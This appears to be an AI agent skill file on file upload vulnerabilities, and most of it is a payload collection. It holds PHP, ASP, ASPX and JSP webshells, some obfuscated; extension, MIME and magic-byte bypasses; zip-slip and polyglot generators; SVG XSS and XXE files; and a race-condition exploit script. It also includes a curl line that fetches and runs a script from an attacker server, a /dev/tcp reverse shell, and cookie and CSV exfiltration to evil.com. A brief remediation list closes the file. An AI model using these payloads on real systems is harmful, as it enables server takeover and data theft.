---
name: file-upload
description: >
  Expert guidance for finding, exploiting, and remediating file upload vulnerabilities. Covers
  webshell upload, extension bypass, MIME type bypass, magic bytes bypass, polyglot files, path
  traversal in filename, zip slip, SVG/XXE upload, imagemagick exploitation, unsafe file parsing,
  race conditions in upload, and client-side validation bypass. Use this skill whenever the user
  mentions file upload vulnerabilities, webshell upload, bypass file extension checks, upload
  restrictions bypass, MIME type spoofing, magic bytes bypass, polyglot files, filename path
  traversal, zip slip, SVG XSS, unsafe image processing, or RCE via file upload. Also trigger
  for "how do I bypass upload filter", "upload PHP shell", "SVG upload XSS", "zip slip attack",
  "polyglot file upload", "image upload to RCE". Always use this skill for any file upload
  security testing question.
---

# File Upload Skill — Testing File Upload Vulnerabilities

File upload flaws are among the most impactful vulnerabilities — ranging from stored XSS via SVG
to full RCE via webshell. The attack surface spans extension validation, MIME checks, content
parsing, and post-upload handling.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| PHP / server-side webshell upload | §3.1 |
| Extension filter bypass | §3.2 |
| MIME type / Content-Type bypass | §3.3 |
| Magic bytes bypass | §3.4 |
| Polyglot files (image + code) | §3.5 |
| Filename path traversal | §3.6 |
| Zip Slip | §3.7 |
| SVG upload → XSS / XXE | §3.8 |
| ImageMagick / image processing RCE | §3.9 |
| Race condition in upload | §3.10 |
| Client-side validation bypass | §3.11 |
| Post-upload access & execution | §3.12 |
| Unsafe file parsing (SSRF, XXE) | §3.13 |

---

## 2. Core Concepts

- **Extension check** — Blocklist (dangerous) vs Allowlist (safe) — allowlist is correct.
- **MIME type** — `Content-Type` header is client-controlled — trivially spoofed.
- **Magic bytes** — File signature bytes (e.g., `FF D8 FF` = JPEG) — can be prepended.
- **Polyglot** — File that is simultaneously valid in two formats (JPEG + PHP).
- **Zip Slip** — Malicious archive that extracts to arbitrary paths on server.
- **Post-upload execution** — Upload succeeds but matters only if file is served/executed.

---

## 3. Attack Techniques

### 3.1 Webshell Upload

```php
// Minimal PHP webshells
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php passthru($_POST['cmd']); ?>
<?php eval($_POST['code']); ?>
<?php echo `$_GET[0]`; ?>

// Obfuscated (bypass simple content scanning)
<?php $f='sys'.'tem';$f($_GET[0]); ?>
<?php @$_=`$_GET[0]`;echo $_;?>
<?= system($_GET[0]) ?>

// After successful upload:
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php?cmd=curl+http://YOUR-SERVER/shell.sh+-o+/tmp/s+%26%26+bash+/tmp/s"
```

```asp
<!-- ASP webshell -->
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>

<!-- ASPX webshell -->
<%@ Page Language="C#" %>
<% var cmd=Request["cmd"]; var exec=new System.Diagnostics.Process();
   exec.StartInfo.FileName="cmd.exe"; exec.StartInfo.Arguments="/c "+cmd;
   exec.StartInfo.RedirectStandardOutput=true; exec.StartInfo.UseShellExecute=false;
   exec.Start(); Response.Write(exec.StandardOutput.ReadToEnd()); %>
```

```jsp
<!-- JSP webshell -->
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

<!-- Better JSP (with output) -->
<%@ page import="java.io.*" %>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
   BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while((l=br.readLine())!=null){out.println(l);} %>
```

---

### 3.2 Extension Filter Bypass

```
# If PHP is blocked, try alternate PHP extensions:
.php .php2 .php3 .php4 .php5 .php6 .php7
.phtml .phar .phps .php.bak
.PHP .PhP .pHp   (case variation)

# Double extensions — server processes last matching:
shell.jpg.php     shell.php.jpg    shell.php.xxx
shell.php%00.jpg  (null byte — old PHP)
shell.php%0a.jpg  (newline)
shell.php;.jpg    (semicolon — IIS)
shell.php:.jpg    (NTFS alternate data stream)

# If ASP blocked:
.asp .aspx .cer .asa .ashx .asmx .shtml .xap

# If JSP blocked:
.jsp .jspx .jsw .jsv .jspf .jtml

# Append hidden extension before allowed
shell.php.jpg     → if server executes first extension
shell.php/./      → directory traversal in filename

# .htaccess upload (Apache — if allowed to upload to web root)
# Upload file named ".htaccess" with content:
AddType application/x-httpd-php .jpg
# Now any .jpg file will be executed as PHP!

# web.config upload (IIS)
# Upload "web.config":
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>
```

---

### 3.3 MIME Type / Content-Type Bypass

```
# Change Content-Type in Burp repeater
# Original: Content-Type: application/php
# Change to:
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp
Content-Type: application/octet-stream

# Example multipart upload with spoofed MIME:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--
```

---

### 3.4 Magic Bytes Bypass

Prepend the expected magic bytes before the webshell payload:

```bash
# JPEG magic bytes + PHP shell
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# PNG magic bytes
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# GIF magic bytes
printf 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
# → file will read as "GIF data" but PHP executes everything

# PDF magic
printf '%PDF-1.4' > shell.php
echo '\n<?php system($_GET["cmd"]); ?>' >> shell.php

# Verify magic bytes
file shell.php   # should say "JPEG image data"
xxd shell.php | head -2
```

---

### 3.5 Polyglot Files

A polyglot is simultaneously valid in two formats:

```bash
# JPEG + PHP polyglot using exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
mv legitimate.jpg shell.php.jpg
# If server passes EXIF through to PHP include → RCE

# GIF polyglot
python3 -c "
data = b'GIF89a' + b'\x01\x00\x01\x00\x00\xff\x00,' + b'\x00'*9 + b'\x02\x02\x4c\x01\x00;'
data += b'<?php system(\$_GET[\"cmd\"]); ?>'
open('polyglot.gif.php','wb').write(data)
"

# PDF + JS polyglot (PDF that executes JS in Acrobat reader)
# Used for XSS or RCE depending on context

# ZIP + PHP polyglot (phar)
# A valid ZIP that PHP can open as a Phar archive
php -r "
\$p = new PharData('shell.phar.gif');
\$p->addFromString('shell.php','<?php system(\$_GET[\"cmd\"]); ?>');
"
```

---

### 3.6 Filename Path Traversal

```
# Write uploaded file outside upload directory
filename: ../shell.php          → /var/www/html/shell.php
filename: ../../shell.php       → /var/www/shell.php
filename: ../../../tmp/shell.php

# URL encoded
filename: ..%2fshell.php
filename: ..%252fshell.php       (double URL encoded)
filename: ..%c0%afshell.php      (Unicode slash)
filename: %2e%2e%2fshell.php

# Write to specific web-accessible paths
filename: ../../../var/www/html/uploads/../shell.php
filename: ....//shell.php        (bypass simple ../ filter)

# Try via parameter too
POST /upload
{"filename": "../../shell.php", "content": "<?php system($_GET['cmd']); ?>"}
```

---

### 3.7 Zip Slip

```bash
# Create a malicious ZIP that extracts to arbitrary path
python3 -c "
import zipfile, os

shell = b'<?php system(\$_GET[\"cmd\"]); ?>'
with zipfile.ZipFile('zipslip.zip','w') as z:
    # Path traversal in zip entry name
    info = zipfile.ZipInfo('../../../../var/www/html/shell.php')
    z.writestr(info, shell)
print('Created zipslip.zip')
"

# Or use evilarc tool
python3 evilarc.py shell.php -o zipslip.zip -p ../../../../var/www/html/ -f

# Tar slip (same concept, tar format)
python3 -c "
import tarfile, io
shell = b'<?php system(\$_GET[\"cmd\"]); ?>'
t = tarfile.open('tarslip.tar.gz','w:gz')
info = tarfile.TarInfo(name='../../var/www/html/shell.php')
info.size = len(shell)
t.addfile(info, io.BytesIO(shell))
t.close()
"
```

---

### 3.8 SVG Upload → XSS / XXE

```xml
<!-- SVG XSS — upload as avatar/image -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="50"/>
  <script type="text/javascript">
    alert(document.cookie);
    // Exfiltrate cookies:
    // fetch('https://evil.com/?c='+document.cookie);
  </script>
</svg>

<!-- SVG XXE — read local files -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

<!-- SVG SSRF -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

### 3.9 ImageMagick RCE (ImageTragick)

```bash
# CVE-2016-3714 — shell injection in image filename/URL processing
# Upload an image file with MVG/MSL content:

# Create malicious file:
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id ")'
pop graphic-context
EOF

# Or as a PNG with embedded MVG:
cat > exploit.png << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?c=id'
pop graphic-context
EOF

# GhostScript injection via PDF upload
# CVE-2018-16509 — upload PDF that executes PostScript

# FFmpeg SSRF (CVE-2016-1897/1898)
# Upload HLS playlist file that references internal URLs:
# #EXTM3U
# #EXT-X-MEDIA-SEQUENCE:0
# #EXTINF:10.0,
# http://169.254.169.254/latest/meta-data/
# #EXT-X-ENDLIST
```

---

### 3.10 Race Condition in Upload

Some apps: upload → validate → delete (if bad) → keep (if good). Race the delete.

```bash
# Send upload + trigger execution simultaneously
# Thread 1 — upload malicious file
# Thread 2 — immediately access the uploaded file

python3 -c "
import threading, requests

URL = 'https://target.com'
TOKEN = 'YOUR-SESSION'
headers = {'Cookie': f'session={TOKEN}'}

def upload():
    files = {'file': ('shell.php', b'<?php system(\$_GET[\"cmd\"]); ?>', 'image/jpeg')}
    r = requests.post(f'{URL}/upload', files=files, headers=headers)
    print('Upload:', r.status_code)

def access():
    import time
    for _ in range(100):
        r = requests.get(f'{URL}/uploads/shell.php?cmd=id', headers=headers)
        if r.status_code == 200 and 'uid=' in r.text:
            print('RACE WON:', r.text)
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start(); t2.start()
t1.join(); t2.join()
"
```

---

### 3.11 Client-Side Validation Bypass

```bash
# 1. Remove JS validation — disable JS in browser or intercept with Burp

# 2. Intercept and modify in Burp:
#    - Change filename extension in multipart body
#    - Change Content-Type header
#    - Remove/modify "accept" attribute effects

# 3. Direct API call (bypass UI entirely)
curl -X POST "https://target.com/api/upload" \
     -H "Authorization: Bearer TOKEN" \
     -F "file=@shell.php;type=image/jpeg"
     
# 4. Rename after upload (if app allows renaming uploaded files)
# Upload as: shell.jpg
# Rename to: shell.php
```

---

### 3.12 Post-Upload Access & Execution

```bash
# Find where uploaded files are stored
# 1. Check response body after upload for URL
# 2. Common paths:
/uploads/   /files/   /media/   /static/   /assets/   /images/
/user-uploads/   /tmp/   /storage/   /cdn/

# 3. Guess filename
# Sometimes: hash of original filename, UUID, or original filename
# Watch response for: {"url": "/uploads/abc123.jpg"}

# 4. If CDN/object storage — can still have XSS via SVG
# CDN may not execute PHP but will serve SVG inline

# 5. Verify execution
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php" -d "cmd=id" -X POST

# 6. Upgrade to reverse shell once RCE confirmed
curl "https://target.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR-IP/4444+0>%261'"
```

---

### 3.13 Unsafe File Parsing

```bash
# DOCX/XLSX parsed server-side → XXE
# (See XXE skill for payload details)

# PDF upload → SSRF via PDF renderer
# Inject in HTML-to-PDF: <img src="http://169.254.169.254/">

# XML upload → XXE
# If app accepts XML configuration files, inject external entity

# ZIP → path traversal (Zip Slip)
# See §3.7

# CSV injection (if CSV is imported and rendered in spreadsheet)
# Cell value: =HYPERLINK("http://evil.com/steal?d="&A1,"Click")
# Or: =IMPORTXML(CONCAT("http://evil.com/",CONCATENATE(A1:E1)),"//a")

# YAML deserialization
# If app parses uploaded YAML
---
!!python/object/apply:os.system ['id']
```

---

## 4. Upload Filter Bypass Decision Tree

```
Is extension checked?
├── YES — try alternate extensions (.php5, .phtml, .PHP, double ext, .htaccess)
└── NO  → proceed

Is MIME type checked?
├── YES — spoof Content-Type to image/jpeg in Burp
└── NO  → proceed

Are magic bytes checked?
├── YES — prepend GIF89a or JPEG bytes before payload
└── NO  → proceed

Is content scanned?
├── YES — obfuscate, polyglot, or use EXIF/metadata injection
└── NO  → proceed

Is filename sanitized?
├── YES — try URL encoding, double encoding, Unicode
└── NO  → test path traversal in filename

Is it executed in webroot?
├── YES — confirm shell execution
└── NO  → check if it's included, parsed, or proxied
```

---

## 5. Remediation

1. **Allowlist extensions** — Only permit specific needed extensions, never blocklist.
2. **Validate magic bytes server-side** — Check actual file content, not just MIME header.
3. **Rename files on upload** — Use random UUID, strip original filename.
4. **Store outside webroot** — Files in `/var/uploads/` not `/var/www/html/uploads/`.
5. **Serve via proxy** — Never execute uploaded files; serve through a static file handler.
6. **Scan content** — Antivirus / content inspection on uploaded files.
7. **Restrict permissions** — Upload directory should not have execute permissions.
8. **Limit file size** — Prevent DoS via huge files.
9. **Sanitize ZIP entries** — Check for path traversal before extraction.
10. **Disable server-side includes** in upload directory (no `.htaccess` overrides).

---

## 6. File Upload Testing Checklist

- [ ] Upload a `.php` file — does it execute?
- [ ] Try alternate PHP extensions: `.php5`, `.phtml`, `.phar`
- [ ] Change Content-Type to `image/jpeg` while keeping `.php` extension
- [ ] Prepend JPEG/GIF magic bytes before PHP payload
- [ ] Try `.htaccess` upload to enable PHP for `.jpg` files
- [ ] Test path traversal in filename: `../shell.php`
- [ ] Upload ZIP with path traversal entries (Zip Slip)
- [ ] Upload SVG with `<script>` for XSS
- [ ] Upload SVG with `<!ENTITY>` for XXE
- [ ] Test race condition between upload and delete
- [ ] Check where files are stored — in webroot?
- [ ] Try CSV injection if CSV import exists
- [ ] Test DOCX/XLSX upload for XXE parsing
- [ ] Check for ImageMagick processing of uploaded images
